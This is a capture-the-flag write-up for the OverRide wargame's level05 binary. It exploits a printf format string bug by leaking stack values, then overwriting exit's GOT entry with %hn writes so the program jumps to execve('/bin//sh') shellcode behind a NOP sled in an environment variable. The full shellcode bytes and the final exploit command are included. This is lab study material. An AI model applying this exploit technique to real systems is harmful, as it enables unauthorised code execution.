# Solution

the program use fgets to get user input and then print it in lowercase
since it use printf without checking the content of the buffer the program is 
vulnerable to printf format bug string attack.

```sh
level05@OverRide:~$ ltrace ./level05 
__libc_start_main(0x8048444, 1, -10540, 0x8048520, 0x8048590 <unfinished ...>
fgets(hello world
"hello world\n", 100, 0xf7fcfac0)                = 0xffffd5c8
printf("hello world\n"hello world
)                                = 12
exit(0 <unfinished ...>
+++ exited (status 0) +++
```

```sh
level05@OverRide:~$ (python -c 'print "AAAAaaaa" + "%p " * 20';) | ./level05
aaaaaaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd5ef 0xffffd5ee (nil) 0xffffffff 0xffffd674 0xf7fdb000 0x61616161 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 
```
we can see that our buffer is located at the 10th and 11th address

```sh
0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	movl   $0x0,(%esp)
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
```
and since the only call after printf is exit we will overwrite the address of exit
with the address of our payload

```sh
readelf -S ./level05
[22] .got              PROGBITS        080497c4 0007c4 000004 04  WA  0   0  4
[23] .got.plt          PROGBITS        080497c8 0007c8 000020 04  WA  0   0  4
```

```sh
(gdb) x/x 0x80497e0
0x80497e0 <exit@got.plt>:	0x08048376
```
We know where to write now we need to build our payload but first let put our shellcode 
with a nop sled in a env variable

```sh
export PAYLOAD=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
get the address of our shellcode

```sh
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *payload = getenv("PAYLOAD");
    if (payload) {
        printf("PAYLOAD address: %p\n", (char *)payload);
    } else {
        printf("PAYLOAD environment variable not set.\n");
    }
    return 0;
}


level05@OverRide:~$ /tmp/a.out 
PAYLOAD address: 0xffffdf15
```
we need to put the address of our shellcode instead of the exit address in the got
we will use $n of printf to write the right amount of byte (shellcode adr) in the exit got adr
since our shellcode adr is very big we will write it in two time and increment the shellcode
adr a bit so we end up in the nop sled

```sh
>>> 0xdf15
57109
>>> hex(57137)
'0xdf31'
>>> 0xffff
65535
>>> 65535 - 57109
8426
>>> 65535 - 57130
8405
>>> 65535 - 57137
8398
```
## TODO

printf format attack writting got table of exit to redirection inside nop sled address

```sh
export PAYLOAD=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%57137x%10$hn%8390x%11$hn"'; cat) | ./level05
```
